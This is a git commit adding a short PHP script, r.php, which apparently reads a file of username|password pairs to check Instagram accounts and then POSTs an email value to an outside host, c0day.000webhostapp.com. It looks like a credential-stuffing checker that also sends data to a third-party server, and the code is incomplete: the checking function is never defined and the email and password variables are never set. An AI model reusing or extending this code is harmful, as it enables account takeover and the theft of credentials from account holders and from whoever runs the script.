15b87df886ab3814e238291e79968a123f5b0e9d
diditx87 <42115824+diditx87@users.noreply.github.com>
2019-04-03 00:32:49 +0700

    Create r.php

---
+++ r.php
@@ -0,0 +1,25 @@
+<?php
+if(isset($argv[1])) {
+    if(file_exists($argv[1])) {
+        $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
+        foreach($ambil as $targets) {
+            $potong = explode("|", $targets);
+            cekAkunIg($potong[0], $potong[1]);
+        }
+    }else die("File doesn't exist!");
+}else die("Usage: php check.php targets.txt");
+$userpass = $email."|".$password;
+
+        $link  = "http://c0day.000webhostapp.com";
+        $c = curl_init($link);
+        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:66.0) Gecko/20100101 Firefox/66.0");
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($c, CURLOPT_TIMEOUT, 60);
+        curl_setopt($c, CURLOPT_VERBOSE, false);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($c, CURLOPT_POSTFIELDS,"m=$email&r=AM8DI4MTD");
+        curl_setopt($c, CURLOPT_POST, 1);
+		$ex = curl_exec($c);
+		echo "sukses";
+		?>
